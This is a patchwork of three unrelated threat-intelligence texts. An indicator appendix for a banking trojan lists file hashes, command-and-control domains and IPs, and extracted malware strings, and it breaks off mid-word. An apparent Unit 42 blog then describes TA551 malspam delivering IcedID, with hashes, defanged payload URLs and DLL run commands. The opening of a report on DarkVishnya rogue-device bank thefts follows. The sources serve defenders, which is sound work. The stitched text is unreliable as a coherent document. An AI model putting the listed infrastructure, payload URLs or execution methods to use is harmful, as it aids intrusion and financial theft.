DLLs 30c8b60ccd66eafb4c861584f45fe80dab71ee22 471a8fd0aa32ce61cf5e4ebece95527d1b234de6 42b990344d77b22578b0a35adda62c0bc02a09a5 be06b838e8b4b2e6bf59ceaafa3fbbb4cebdc522 f9183b6e29fee2c3467fc591bae9bb5fe9975027 c8f0c4a88397c16695e1352a48c538fb02f1cb16 e942145c0f3549bf7be79cbf5a4031cf6614af19 0705bda19096b05130e5768ea8efdaa864ddaff0 c75273cd886c3ea18a5be7e99b11044f88abd3ef e0f377551d5b6553eedf9a0c3ef23eabfc7a937e e7777db52fc9d34d57253db242f9c195d24836d8 ef7de8d746c413a8925aa6a01f7130cfc7eac2df 00fe6cf9c85821a2a2479083acb538ee49c8c141 5d6a96466e60f15b296d9b0d4cb3e095957d0aa4 9172dd756893fe9e68b2dcc85613e7346d1a25ef 5f357fbb6ae832f7a0fcfa824fa4026db4000a0a ebdd585edfe6ff9359a38cb7fb65871f418c6c33 c3ba475f4e160a153c3baada8042b6aca5d06618 f6755195445ce89f61df8ad6aaf2bf491804224a 4a670cc34e59ea94e88c19eef6a4106cf5411624 5153886fec6cfed815601e68678286633bc564ec 4d83f2f601036bc770857f96ab16017b0afb6927 be83dd98b269bb2faf9e28e35734d3bfcf635166 f4c746696b0f5bb565d445ec49dd912993de6361 d8f3c6a1bb43d014fa34eaaae41a8d9eefd7c3b6 31b7215c892a0064a6f59c16d68a1decf39012a9 5521cce3e5e68eb6b8f7fa129daf143151436b2d da0c6236909ea861b2d24794e88ff44c051ade64 822e05f998f5d727d5a663d06273da507ef5f135    5b7355ea8152b95a7ab9bb91e5836bf7acc39993 1f100e41213be79deacc86a9246e1d0b8a76d64b fd4b98893de80ef3fe83b58017df9718993d8bcb 6f036c802384826b630aec70d9833b5b0ed735eb 1e4b84be1e4287c9787cd56009e1e2adb3348db8 6cf45111b2d71862803cf91f2a79780149c46a27 af862050a01972db36589653dc8b155e2b3e2f8c b31a565e7c29b861b182c9880b5d38cb4211ab8f dde57ff3b630a1b4052c3ef290bb361de96eab06 bdf77429c785514bf308f7c1d1e9ddca63a33ac8 2f6fd3b5a7611d72f9f9eb60b04471f9bebc738f 0b40873f86c2e6c676dfc003c232aa3167654172 d6004423e7b80d47b6215c9d1875122e128899ed c4834a4e548b82ffe5d90042c78311b537564fe6 5cc1ac4f0cc6df3f0dbe2b53864a0f47899939c8 4733cf689dcc588b94fd0fba7ad4d93973486752 7175b734aa1273710008a2af6398f8bfc55f7f6b cab9247484a6c7a10672b7ca8849dd7b4577be02 daa0673cb1d3eb7dbe8aa435997ecd9e1da228fd f04300e901870efa9c9e49c440baaac23b0ce96c 9a131fc27f5397e32596e81df22260885b53cdfd 094ac3c414a9e6028afa5cdc0d4b4f3aa98b92ca 9a3e89d62795a1cb0747d279a6fdf65bfc8d5c8d df1a4c99791570a2d203075581a6aeef59ece02b 94e21bac5c0fc0d8d583a0b9b1daf5d18528cc9f aa0fa4584768ce9e16d67d8c529233e99ff1bbf0 6.4.2. Droppers/Downloaders 0961119783365e8b4dff12df7c7ae9f7388a410c 662b4daea4b07e7c95f4a58cf0be0f0281c81c67 859f66a7057304e72eaff58ded1a2aeae29a41dc 42a4b04446a20993ddae98b2be6d5a797376d4b6 48bc113ec8ba20b8b80cd5d4da92051a19d1032b 025c718ba31e43db1b87dc13f94a61a9338c11ce 059a114c2ec56434251cec7db4828418335cf29a 4a084e70fa2e6425c68c692b560acae68f89e69f 77a7735d0f83610e4d581850dd89ea15b6c5f699 83db465d10e6f403cf28ed714fbdf5e218b8fb41 8b77419e6c006303f078e77e6c1ca21547b8bdd1 9ac461ef9848367f46bf64649d46de955c4afc66 a1c7b51747ad13c5a1df470098a4585e1f24a5c4 a6d3e97d832d17d589c1a0aa24baaeccd73a2b39 e9fe3259bceb852ec1b8e5a01ff19eb7e3b08fbc f539f5f3847d60ef6b6bfe32be76fe190b9298b0 e36f88d67cd50a9bc2e5d30cbf26577ffadd4a90 d125a868c393c3490d2d24016edb159a2a5ad0a9 92a1c9fc9069744653d4d3733ebf8669a84351b9 9d2fd31c086f0e982f6b973ee5951173ab69d0b2 cca9ade798a61450adbbcac5e433dadde11867ba fca3d02a53e66d8975997ff2b03c8008a254a508 312a487b2830c62845f6feaf11d4af7c25783f1a c4844acd88eeb104a05a775e475bc48e05a238e7 c824ee17138d2002a712744c3012fc51355fb044 85a6d6938680b30bac2c755a502f6b4f104643a3 d0390f4bcd5c0a952c012fbd034e78dbe88ed184 43a4c65da2c112c42e910f4e6ea359c759064d52 5b38be812c5e21fb9efb01eea845704cf9978a6d c6e3aa123a52762bf2690b97cc79148eedd0e1e0 136185555755c537522e5ccc8a0d7487dc9dcffa 7c48114467776541032206fd9ae22be8490c45ba f89e56dd9ca78cec02d0a2b95803843c59234082 1e3061c49cf62821ca17b835b7ff8d9d8a3bb6c2 f667d946acbc69d70ea0978b9b6878d232665cad 49994863baffba440212bd24232df21fbf93d812 7c1b6b1713bd923fc243dfec80002fe9b93eb292 b74f71560e48488d2153ae2fb51207a0ac206e2b    6.4.3. Modules 03DE8622BE6B2F75A364A275995C3411626C4D9F 8966319882494077C21F66A8354E2CBCA0370464 B1EE562E1F69EFC6FBA58B88753BE7D0B3E4CFAB 6.5. C&C server domain names f72bba81c921(.)livejournal(.)com/data/rss webstatisticaonline(.)tech vpntap(.)top rtm(.)dev cainmoon(.)net micro4n(.)top ssdcool(.)top cash-money-analitica(.)bit money-cash-analitica(.)bit vpnomnet(.)bit vpnkeep(.)bit fde05d0573da(.)bit d47ea26b7faa(.)bit feb96eb2aa59(.)bit 6.6. C&C server IP addresses 5.154.190(.)167 5.154.190(.)168 5.154.190(.)189 5.154.191(.)57 5.154.191(.)154 5.154.191(.)174 5.154.191(.)225 37.1.206(.)78 88.208.28(.)147 91.207.7(.)69 91.215.153(.)31 93.170.168(.)218 93.190.139(.)66 95.183.52(.)182 109.236.82(.)150 109.248.32(.)152 131.72.138(.)169 138.201.104(.)161 154.70.153(.)125 158.255.6(.)150 158.255.208(.)197 185.61.149(.)70 185.61.149(.)78 185.82.201(.)45 185.82.216(.)14 185.128.42(.)237 185.141.27(.)249 185.169.229(.)42 188.138.71(.)117 200.74.240(.)80 200.74.240(.)134 212.48.90(.)155 213.184.127(.)137 217.23.6(.)29 6.7.

PDB paths getapulab.pdb    6.8. Strings ZKRT, winhttp.dll, WinHttpOpen, WinHttpCloseHandle, WinHttpConnect, WinHttpOpenRequest, WinHttpReadData, WinHttpCrackUrl, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpSetOption, Software\\, keylogger.last-data, keylogger.last-wnd-caption, keylogger.last-exe-path, FRTnBm6glKEZf60, kosmos, botnet-prefix, botnet-id, cc.connect-interval, GetSystemDefaultUILanguage, RTM_ModuleEP, scan-files, crypt32. dll, CryptUnprotectData, post-install-report, cc.url.1, cc.url.2, __, x32, x64, , , modules., modules-data., core, msg, del-module, unload, uninstall, uninstall-lock, find-files, shutdown, reboot, cfg-set-str-a, cfg-set-str-w, cfg-set-dw, cfg-get-str-a, cfg-get-str-w, cfg-get-dw, cfg-del-param, screenshot, dns, lpe-runas-flags, SOFTWARE\\ Microsoft\\Windows NT\\CurrentVersion, EditionID, Service Pack , SP, CSDVersion, CurrentVersion, CurrentBuildNumber, scards.monitoring-interval, files found, image/ png, .png, ROOT, csrss.exe, OldFile, Updated, dbo.detected, bsi.dll?, online.payment. ru, bankline.ru, /ic/login.zhtml, /servlets/ibc, faktura.ru, /iclient/, ibank2, bco.vtb24.ru, elbrus.raiffeisen, elba.raiffeisen, handybank., wupos.westernunion, online.sberbank., Unk, SberBank_PC, BSS, BSS_PC, iBank2_PC, Faktura, PCB, InterPro, RosBank, SberBank_BO, INIST, Inversion, Interbank, iBank2, BiCrypt, VTB24, 1C, SGB, Raiffeisen, HandyBank, WU, SberBank_Fiz, CFT, WinPost, SBIS, ClBank, QiwiCashier, ISCC, WebMoney, XTC, iFOBS, TRANSAQ, OSMP, IExplore, Firefox, 0xFFFFFFFF, WWW_GetWindowInfo, \”,\”, gdiplus.dll, GdipGetImageEncodersSize, GdipGetImageEncoders, GdiplusStartup, GdiplusShutdown, GdipCreateBitmapFromHBITMAP, GdipDisposeImage, GdipSaveImageToStream, ole32.dll, GetHGlobalFromStream, CreateStreamOnHGlobal, kernel32.dll, CloseHandle, user32.dll, ToUnicode, CloseClipboard, WinSCard.dll, SCardFreeMemory, SCardListReadersW, SCardEstablishContext, SCardReleaseContext, SCardGetStatusChangeW, SeShutdownPrivilege, auto-elevate, Elevating success, Elevating failed, reload, Reloaded, ntdll.dll, RtlAdjustPrivilege, ZwShutdownSystem, new-cc, hosts-add, hosts-clear, dbo-scan, scard-off, modules-off, dbo-detector-off, multiinstance-off, keylogger-off, dnsapi.

dll, DnsQuery_A, DnsRecordListFree, dns.dot-bit.org, 193.183.98.154, 106.186.17.181, 50.116.23.211, 130.255.73.90, 109.69.8.34, File already updated, post-install-reporturl, 527D67BF-0D37-46D8-895F-D662E8A12190, 3998A1EC-1726-42CA-830C-D6E966D21411, 5B42B658-6029-44FD-9561-1ED64E89A0AA, 692B2F88-60F4-45A4-88E2-946F98E12773, A69D400E70E8-45F4-9438-80734E1FEA72, SYSTEM\\CurrentControlSet\\services\\Disk\\Enum, sdtf, D2, GET, POST, HTTP/1.1, Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0), Accept: text/html, application/xhtml+xml, */*\r\nAccept-Language: en-US\r\nConnection: Close, Accept: t, http://vpnomnet.bit/r/z.php, http://vpnkeep.bit/r/z.php, non, ?a=started&fid=, *.*, *.dtt, .dtt, rundll32.exe, open, regedit.exe, BUTTON, STATIC, msctls_progress32, DISPLAY, Windows Registry Error, Windows >\u00041\u0004=\u00040\ u0004@\u0004C\u00046\u00048\u0004;\u00040\u0004 ?\u0004>\u00042\u0004@\u00045\u00046\ u00044\u00045\u0004=\u0004=\u0004K\u00045\u0004 7\u00040\u0004?\u00048\u0004A\u00048\ u0004 @\u00045\u00045\u0004A\u0004B\u0004@\u00040\u0004, Windows has encountered a corrupted registry records, \u0018\u0004A\u0004?\u0004@\u00040\u00042\u00048\u0004B\ u0004L\u0004 7\u00040\u0004?\u00048\u0004A\u00048\u0004, Restore records, \u0018\ u0004A\u0004?\u0004@\u00040\u00042\u00048\u0004B\u0004L\u0004 7\u00040\u0004?\u00048\ u0004A\u00048\u0004 8\u0004 ?\u0004@\u0004>\u00042\u00045\u0004@\u00048\u0004B\u0004L\ u0004 =\u00040\u0004 >\u0004H\u00048\u00041\u0004:\u00048\u0004, Restore records and check for errors, \u001f\u0004>\u00044\u0004@\u0004>\u00041\u0004=\u00045\u00045\u0004 >\u00041\u0004 M\u0004B\u0004>\u00049\u0004 >\u0004H\u00048\u00041\u0004:\u00045\u0004, More details about this error, \u001e\u00041\u0004=\u00040\u0004@\u0004C\u00046\u00045\ u0004=\u0004K\u0004 ?\u0004>\u00042\u0004@\u00045\u00046\u00044\u00045\u0004=\u0004=\ u0004K\u00045\u0004 7\u00040\u0004?\u00048\u0004A\u00048\u0004 2\u0004 @\u00045\u00045\ u0004A\u0004B\u0004@\u00045\u0004 Windows., Multiple corrupted records has been found in Windows registry., \u0014\u0004;\u0004O\u0004 C\u0004A\u0004B\u0004@\u00040\u0004=\ u00045\u0004=\u00048\u0004O\u0004 >\u0004H\u00048\u00041\u0004:\u00048\u0004, Windows 8\u0004A\u0004?\u0004@\u00040\u00042\u00048\u0004B\u0004 ?\u0004>\u00042\u0004@\u00045\ u00046\u00044\u00045\u0004=\u0004=\u0004K\u00045\u0004 7\u00040\u0004?\u00048\u0004A\ u00048\u0004., To resolve this problem, Windows restore these records., \u0014\u00045\ u0004B\u00040\u0004;\u00048\u0004 >\u0004H\u00048\u00041\u0004:\u00048\u0004: \u001d\ u00045\u00042\u00045\u0004@\u0004=\u0004K\u00049\u0004 4\u00045\u0004A\u0004:\u0004@\ u00048\u0004?\u0004B\u0004>\u0004@\u0004, Error details: Incorrect descriptor, \u001f\ u0004>\u00042\u0004@\u00045\u00046\u00044\u00045\u0004=\u0004=\u0004K\u00045\u0004 7\ u00040\u0004?\u00048\u0004A\u00048\u0004:, Corrupted records: , \u001a\u0004>\u0004;\ u00048\u0004G\u00045\u0004A\u0004B\u00042\u0004>\u0004 7\u00040\u0004?\u00048\u0004A\ u00045\u00049\u0004: 3, Corrupted records count: 3, \u001e\u0004B\u0004<\u00045\u0004=\ u00040\u0004, Cancel, \u001e\u0004H\u00048\u00041\u0004:\u00040\u0004: \u001d\u00045\ u00042\u00045\u0004@\u0004=\u0004K\u00049\u0004 4\u00045\u0004A\u0004:\u0004@\u00048\    u0004?\u0004B\u0004>\u0004@\u0004\r\n\u001a\u0004>\u00044\u0004 >\u0004H\u00048\u00041\ u0004:\u00048\u0004: 0xc0005071, Error: Incorrect descriptor\r\nError code: 0xc0005071, Microsoft Windows, \u001f\u0004@\u0004>\u00042\u00045\u0004@\u0004:\u00040\u0004 4\ u00045\u0004A\u0004:\u0004@\u00048\u0004?\u0004B\u0004>\u0004@\u0004>\u00042\u0004 @\ u00045\u00045\u0004A\u0004B\u0004@\u00040\u0004 Windows, Windows checking registry descriptors, \u001f\u0004>\u00046\u00040\u0004;\u0004C\u00049\u0004A\u0004B\u00040\ u0004, ?\u0004>\u00044\u0004>\u00046\u00044\u00048\u0004B\u00045\u0004..., Please, whait..., runas, \”,DllGetClassObject host, .1, #32770, SysCredential, ComboBoxEx32, ComboBox, Edit, CLIPBOARD, .exe, WbemScripting.SWbemLocator, localhost, root\\CIMV2, SELECT * FROM Win32_NetworkAdapterConfiguration Where IPEnabled = True, WQL, root\\ SecurityCenter, SELECT * FROM AntiVirusProduct, \\VarFileInfo\\Translation, \\ StringFileInfo\\, ProductVersion, wclnt.exe, cbmain.ex, ibank.odb, internetbanktools.

exe, LegalCopyright, ProductName, bicrypt, faktura, client.jks, intpro.exe, npbssplugin. dll, bssax.ocx, cbsmain.dll, isclient.exe, 1cv8.exe, 1cv8c.exe, 1cv8s.exe, 1cv7.exe, 1cv7l.exe, 1cv7s.exe, sgbclient.exe, rclient.exe, cft - bank client, winpost.exe, sbis.exe, sbis.dll, clbank.exe, qiwicashier.exe, iscc.exe, webmoney.exe, _ftcgpk.exe, wallet.dat, ifobsclient.exe, transaq.exe, maratl.exe, 1\u00040\u0004=\u0004:\u0004, bank, SunAwtFrame, SunAwtDialog, \u0012\u0004E\u0004>\u00044\u0004 2\u0004 A\u00048\ u0004A\u0004B\u00045\u0004<\u0004C\u0004, MozillaWindowClass, IEFrame, \u001b\u0004>\ u00043\u00048\u0004=\u0004, TLoginWindow, TfmISClient, TInitialForm, \u001a\u0004;\ u0004N\u0004G\u0004 M\u0004;\u00045\u0004:\u0004B\u0004@\u0004>\u0004=\u0004=\u0004>\ u00049\u0004 ?\u0004>\u00044\u0004?\u00048\u0004A\u00048\u0004, obj_button, obj_static, tpanel, tbsvkcontrolscroller, Tahoma, *.pif, pif, .job, Software\\Microsoft\\Windows\\ CurrentVersion\\Run, Windows Update, Tasks\\, Microsoft Corporation, Updating Windows components., Author, PT0S, schedule, Winlogon, \\winlogon.lnk, \”,DllGetClassObject , SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon, Shell, \\\\.\\PhysicalDrive, bootmgr, ntldr, Global\\, drivers\\etc\\hosts, ipconfig /flushdns, iexplore.exe, firefox.exe, xb

Executive Summary
TA551 (also known as Shathak) is an email-based malware distribution campaign that often targets English-speaking victims. The campaign discussed in this blog has targeted German, Italian and Japanese speakers. TA551 has historically pushed different families of information-stealing malware like Ursnif and Valak. After mid-July 2020, this campaign has exclusively pushed IcedID malware, another information stealer. This blog provides an overview of TA551, as well as previous activity from this campaign. We also examine changes from this campaign since our previous blog about TA551 pushing Valak in July 2020. The image represents malicious email campaigns, such as TA551, often push a variety of malware, such as Valak and IcedID. Palo Alto Networks Next-Generation Firewall customers are protected from this threat with the Threat Prevention security subscription, which detects the malware. AutoFocus customers can track this activity using the TA551 and IcedID tags. Infection Chain of Events
From mid-July through November 2020, TA551 has remained consistent in its infection process.

A flow chart for the chain of events is shown in Figure 1. TA551 (Shathak) chain of events include 1) malicious email with attachment, 2) attached zip archive, password-protected, 3) extracted Word document, 4) enable macros, 5) HTTP traffic for IcedID installer, 6) installer DLL, 7) HTTPS traffic for IcedID binary, 8) IcedID binary persistent on the infected host, 9) HTTPS post-infection traffic. Figure 1. Chain of events for TA551 (Shathak) from July through November 2020. The initial lure is an email spoofing an email chain. These email chains are retrieved from email clients on previously infected hosts. The message has an attached ZIP archive and a message informing the user of a password necessary to open the attachment. After opening the ZIP archive, the victim finds a Microsoft Word document with macros. If the victim enables macros on a vulnerable Windows computer, the victim’s host retrieves an installer DLL for IcedID malware.

This will infect a vulnerable Windows computer. See FIgures 2-7 for a recent example targeting a Japanese-speaking victim. A malicious email targeting a Japanese-speaking victim on Nov. 4, 2020, including a ZIP archive that leads to an installer DLL for IcedID malware. Figure 2. An example of TA551 email targeting a Japanese-speaking victim on Nov. 4, 2020. The screenshot shows a user opening the ZIP archive using the password provided in the malicious email. Figure 3. Using password from the message to open the ZIP archive. The Word document retrieved from the malicious ZIP archive contains macros which can harm a vulnerable computer if enabled. Figure 4. Screenshot of Word document from the ZIP archive. The screenshot shows traffic from an IcedID infection filtered in Wireshark. Figure 5. Traffic from an infection filtered in Wireshark. Files and directories created during the infection process on a Windows host include the inital IcedID DLL, installer DLL, copy of mshta.exe and persistent IcedID DLL.

These files and directories are indicated with red arrows in the screenshot. Figure 6. Files and directories created during the infection process on a Windows host. The screenshot shows a scheduled task with "multiple triggers defined." This task keeps the IcedID infection persistent on an infected Windows host. Figure 7. Scheduled task to keep the IcedID infection persistent on an infected Windows host. TA551 Switches to IcedID
We have a GitHub repository where we track recent TA551 activity. The repository contains information on each wave of attack from TA551 since July 6, 2020. Starting on July 14, 2020, we have only seen IcedID malware from these waves of attack. Since July 14, 2020, these waves of malspam consistently targeted English-speaking victims until Oct. 27, 2020, when we started seeing Japanese templates for the Word documents. TA551 consistently targeted Japanese-speaking victims from Oct. 27-Nov. 20, 2020. After approximately three weeks of Japanese-focused attacks, TA551 switched back to English-speaking victims starting on Nov.

24, 2020. Regardless of the targeted group, TA551 continues to push IcedID as its malware payload. History of TA551
We have traced TA551 as far back as February 2019, and since that time, we have noted the following characteristics:

TA551 has distributed different families of malware, including Ursnif (Gozi/ISFB), Valak and IcedID. TA551 malspam spoofs legitimate email chains based on data retrieved from previously infected Windows hosts. It sends copies of these email chains to recipients of the original email chain. The spoofed email includes a short message as the most recent item in the chain. This is a generic statement asking the recipient to open an attached ZIP archive using the supplied password. File names for the ZIP archives use the name of the company being spoofed in the email. For example, if the spoofed sender is someone@companyname.com, the ZIP attachment would be named companyname.zip. In 2020, we also started seeing emails with info.zip or request.zip as the attached ZIP archive names.

These password-protected ZIP attachments contain a Word document with macros to install malware. File names for the extracted Word documents follow noticeable patterns that have evolved as this campaign has progressed. URLs generated by the associated Word macros also follow noticeable patterns that have also evolved as this campaign has progressed. TA551 in 2019
Figure 8 shows the earliest email we can confirm from this campaign, dated Feb. 4, 2019. It targeted an English-speaking recipient and pushed Ursnif malware. TA551 malspam from February 2019 includes extracted document name: Request11.doc
Figure 8. Example of TA551 malspam from February 2019. The following files are associated with the above example:

SHA256 hash: 3dab8a906b30e1371b9aab1895cd5aef75294b747b7291d5c308bb19fbc5db10
File size: 157,696 bytes
File name: Request11.doc
File description: Word doc with macro for Ursnif (Gozi/ISFB)
SHA256 hash: 3afc28d4613e359b2f996b91eeb0bbe1a57c7f42d2d4b18e4bb6aa963f58e3ff
File size: 284,160 bytes
File location: hxxp://gou20lclair[.]band/xap_102b-AZ1/704e.php?l=zyteb12.gas
File description: Example of Windows EXE retrieved by Word macro – an installer for Ursnif

Figure 9 shows an email from this campaign dated April 2, 2019.

It targeted an Italian-speaking recipient and pushed Ursnif malware. TA551 malspam from April 2019 includes extracted document name: doc_02.04.doc
Figure 9. Example of TA551 malspam from April 2019. The following files are associated with the above example:

SHA256 hash: 582213137bebc93192b0429f6687c859f007ef03e6a4c620eada8d98ca5d76ba
File size: 91,136 bytes
File name: doc_02.04.doc
File description: Word doc with macro for Ursnif
SHA256 hash: 8c72d5e5cb81f7a7c2b4881aff3be62cdc09caa52f93f9403166af74891c256e
File size: 606,208 bytes
File location: hxxp://seauj35ywsg[.]com/2poef1/j.php?l=zepax4.fgs
File description: Example of Windows EXE to install Ursnif retrieved by a macro associated with this wave of Word documents
Figure 10 shows an email from this campaign dated Oct. 30, 2019. It targeted a German-speaking recipient and pushed Ursnif malware. TA551 malspam from October 2019 includes extracted document name: info_10_30.doc
Figure 10. Example of TA551 malspam from October 2019. The following files are associated with the above example:

SHA256 hash: 10ed909ab789f2a83e4c6590da64a6bdeb245ec9189d038a8887df0dae46df2a
File size: 269,312 bytes
File name: info_10_30.doc
File description: Word doc with macro for Ursnif
SHA256 hash: 9e5008090eaf25c0fe58e220e7a1276e5501279da4bb782f92c90f465f4838cc
File size: 300,032 bytes
File location: hxxp://onialisati[.]com/deamie/ovidel.php?l=brelry2.cab
File description: Example of Windows EXE retrieved by Word macro – an installer for Ursnif
Note how the URL from the above example ends in .cab.

This pattern was fairly consistent for URLs generated by macros from TA551 Word docs until late October 2020. Figure 11 shows an email from this campaign dated Dec. 17, 2019. It targeted a Japanese-speaking recipient and pushed Ursnif malware. TA551 malspam from December 2019 includes extracted document name: info_12_18.doc
Figure 11. Example of TA551 malspam from December 2019. The following files are associated with the above example:

SHA256 hash: 3b28f3b1b589c9a92940999000aa4a01048f2370d03c4da0045aabf61f9e4bb6
File size: 101,528 bytes
File name: info_12_18.doc
File description: Word doc with macro for Ursnif
SHA256 hash: 3a22d206858773b45b56fc53bed5ee4bb8982bb1147aad9c2a7c57ef6c099512
File size: 1,650,176 bytes
File location: hxxp://vestcheasy[.]com/koorsh/soogar.php?l=weecum5.cab
File description: Example of Windows EXE retrieved by Word macro – an installer for Ursnif
Note that Ursnif-infected hosts occasionally retrieve follow-up malware. For example, on Dec. 19, 2019, a Windows host infected with Ursnif by way of TA551 was also infected with IcedID and Valak as follow-up malware. TA551 in 2020
Figure 12 shows an email from TA551 dated March 26, 2020.

It targeted a German-speaking recipient and pushed ZLoader (Silent Night) malware. TA551 malspam from March 2020 includes extracted document name: information_03.26.doc
Figure 12. Example of TA551 malspam from March 2020. The following files are associated with the above example:

SHA256 hash: 62ecc8950e8be104e250304fdc32748fcadaeaa677f7c066be1baa17f940eda8
File size: 127,757 bytes
File name: information_03.26.doc
File description: Word doc with macro for ZLoader (Silent Night)
SHA256 hash: 9b281a8220a6098fefe1abd6de4fc126fddfa4f08ed1b90d15c9e0514d77e166
File size: 486,400 bytes
File location: hxxp://x0fopmxsq5y2oqud[.]com/kundru/targen.php?l=swep7.cab
File description: Windows DLL for ZLoader retrieved by Word macro
Figure 13 shows an email from this campaign dated April 28, 2020. It targeted an English-speaking recipient and pushed Valak malware. TA551 malspam from April 2020 includes document names such as: docs,04.20.doc, inquiry_04.20.doc, files 04.28.2020.doc, legal paper,04.20.doc, certificate,04.28.2020.doc, specifics-04.20.doc
Figure 13. Example of TA551 malspam from April 2020. The following files are associated with the above example:

SHA256 hash: bd58160966981dd4b04af8530e3320edbddfc2b83a82b47a76f347d0fb4ca93a
File size: 61,233 bytes
File name: docs,04.20.doc
File description: Word doc with macro for Valak
SHA256 hash: 9ce4835ef1842b7407b3c8777a6495ceb1b69dac0c13f7059c2fec1b2c209cb1
File size: 418,816 bytes
File location: hxxp://qut6oga5219bf00e[.]com/we20lo85/aio0i32p.php?l=nok4.cab
File description: Example of Windows DLL retrieved by Word macro -- an installer for Valak
At this point, the document names had changed format.

This is when we started seeing several different names for the extracted Word documents from each day of attack. Figure 14 shows an email from this campaign dated May 22, 2020. It targeted an English-speaking recipient and pushed Valak malware. Malspam from May 2020 includes document names such as: input_05.20.doc, document_05.20.doc, deed contract 05.20.doc, contract_05.22.2020.doc, prescribe-05.22.2020.doc, command-05.22.2020.doc
Figure 14. Example of TA551 malspam from May 2020. The following files are associated with the above example:

SHA256 hash: 3562023ab563fc12d17981a1328f22a3d3e4c358535b9a0c28173a6e4ad869ba
File size: 74,338 bytes
File name: file_05.20.doc
File description: Word doc with macro for Valak
SHA256 hash: 4468edc18de42e61b64441c75aedcb15d553410d473e77fc8ae31b358acd506a
File size: 184,832 bytes
File location: hxxp://s6oo5atdgmtceep8on[.]com/urvave/cennc.php?l=haao1.cab
File description: Example of Windows DLL retrieved by Word macro -- an installer for Valak
By this time, the password format for ZIP attachments changed to three digits followed by two letters, and the template style had also been updated. We continued to see Valak pushed by TA551 through early July 2020.

Of note, Valak is a malware downloader, and we frequently saw IcedID as follow-up malware from these infections. However, by mid-July 2020, TA551 started pushing IcedID directly from the Word document macros. Recent Developments
In recent weeks, TA551 has changed traffic patterns. For several months prior to Oct. 19, 2020, URLs generated by Word macros to retrieve installer binaries followed a noticeable pattern. This pattern includes:

.php?l= in the URL path
URLs end with .cab
Since Oct. 20, 2020, these patterns have changed dramatically. Table 1 shows the changes starting in October. Date	URL example
2020-10-14	GET /docat/hyra.php?l=dybe18.cab
2020-10-16	GET /muty/sohaq.php?l=tali18.cab
2020-10-19	GET /biwe_zibofyra/ripy_lani.php?l=qedux18.cab
2020-10-20	GET /_bxlzcpjlmpxlkzblf_zhlsplspz/wtlmwrqnnxfwgzzlkvzdbvnp_mphdqpggxfljvffj_.php?l=chfon4.ppt&lhe=hcqjvtfezhsogtrdxdfs
2020-10-27	GET /update/qqOQccpolFmwCmTnTmURcfZPByI_lqzPNvPfTfvLQjqdJtpOYeWT/WRFlVYjJTKqWAf_KhCjsSselY/tbqxj12
2020-10-28	GET /update/djMqKxc_BZCF_BJlRmjKmdcihghiSj/wJuzcnBhc/MD/qE_ZWFKbwfWZMCCWgfHU_DNxAcBRlHncRHr/csyj9
2020-10-29	GET /update/XTZrbyvClXzcfZcJGZSmDWBthSBXjRKw/chti6
2020-11-03	GET /update/VvZWoYOIotoWV_KUywQtEUVUPjvNYMYYnLnvWWOLA/fZcXYRwGyzMRZcvzHZrDe/gzlov4
2020-11-04	GET /update/JvYqBVMJCxSDX/nNBk/XhEfjPMvaV_dDFlXqGZNCDTLhTXlPWxEsGjTdzfQBUZCvkBqWOgjo/xrei12
2020-11-05	GET /update/jcja/yCGHnwRmyMVTeCqljgln/JTHBIgVESrNVdrgJMGGNdiqqGxCNACjXDBjkMJKFPKvJNYXFVbcxYvbS/iuyala13
2020-11-19	GET /share/ZSzE0sjR23GkF3VwZi_nqFH2B5lqPUVKxwNC/ahtap3
2020-11-24	GET /share/kvNqzh1tF4Y8zyxtL/HQpK6K42Wr8SP9PLJSqxc5h/ROwPcKsG/dbULREqlb1Kj0_RRT/Dfnj/lxnt10
Table 1. URL patterns generated by macros from Word docs distributed by TA551. By Oct. 27, 2020, URLs generated by TA551 macros include English terms like update or share at the beginning of the HTTP GET request.

These URLs end with a series of four to six lowercase English letters followed by a number as low as 1 to as high as 18. These URLs are not consistent in length, and they can be very short or very long. Since November 2020, we have also noticed minor changes in artifacts generated during IcedID infections, including those outside of the TA551 campaign. For example, through early November 2020, IcedID DLLs created by installer DLLs were initially saved to the victim’s AppData\Local\Temp directory, and the file name started with a tilde (~) and ended with .dll as illustrated earlier in Figure 6. In November 2020, we started to see a change: the initial IcedID DLLs saved to the victim’s AppData\Local directory with a file name ending in .dat as shown in Figure 15. In Nov. 24, 2020, artifacts from an IcedID infection included files and directories such as: initial IcedID DLL, persistent IcedID DLL, PNG image with encoded data used to create initial IcedID DLL, installer DLL retrieved by Word macro, PNG image with encoded data seen after initial IcedID is run.

Red arrows indicate these files and directories in the screenshot. Figure 15. Artifacts seen from a TA551 IcedID infection on Nov. 24, 2020. These changes may be an effort by malware developers to evade detection. At the very least, they might confuse someone conducting forensic analysis on an infected host. Such changes are commonly seen in malware families as they evolve over time. We can expect to see more changes with IcedID malware and the TA551 campaign during the coming months. Finally, the run method for installer DLLs retrieved by TA551 Word macros changed during November 2020:

Old method: regsvr32.exe [installer DLL filename]
New method: rundll32.exe [installer DLL filename],ShowDialogA -r
However, up-to-date information is necessary to ensure proper detection for a constantly-evolving campaign like TA551. Conclusion
TA551 has evolved since we last reviewed this threat actor deploying Valak malware in July 2020. We frequently saw IcedID as follow-up malware in previous months from Valak and Ursnif infections installed by TA551.

This threat actor appears to have eliminated malware downloaders like Valak and Ursnif and is now deploying IcedID directly. Although TA551 has settled on IcedID as its malware payload, we continue to see changes in traffic patterns and infection artifacts as this campaign evolves. Organizations with adequate spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection. Palo Alto Networks Next-Generation Firewall customers are further protected from this threat with the Threat Prevention security subscription, which detects the malware. AutoFocus customers can track this activity using the TA551 and IcedID tags.

While novice attackers, imitating the protagonists of the U.S. drama Mr. Robot, leave USB flash drives lying around parking lots in the hope that an employee from the target company picks one up and plugs it in at the workplace, more experienced cybercriminals prefer not to rely on chance. In 2017-2018, Kaspersky Lab specialists were invited to research a series of cybertheft incidents. Each attack had a common springboard: an unknown device directly connected to the company’s local network.
In some cases, it was the central office, in others a regional office, sometimes located in another country. At least eight banks in Eastern Europe were the targets of the attacks (collectively nicknamed DarkVishnya), which caused damage estimated in the tens of millions of dollars. Each attack can be divided into several identical stages. At the first stage, a cybercriminal entered the organization’s building under the guise of a courier, job seeker, etc., and connected a device to the local network, for example, in one of the meeting rooms. Where possible, the device was hidden or blended into the surroundings, so as not to arouse suspicion.
High-tech tables with sockets are great for planting hidden devices

